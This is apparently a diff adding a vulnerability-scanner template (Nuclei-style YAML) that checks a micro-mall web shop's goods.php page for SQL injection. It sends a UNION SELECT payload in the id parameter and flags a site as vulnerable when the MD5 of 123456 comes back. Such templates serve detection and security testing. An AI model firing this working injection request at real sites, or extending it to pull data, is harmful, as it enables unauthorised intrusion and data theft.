@@ -1,0 +1,30 @@
+id: weishangcheng-goods_php-sql
+
+info:
+  name: 微商城系统 goods.php SQL注入
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(123456)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e10adc3949ba59abbe56e057f20f883e'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
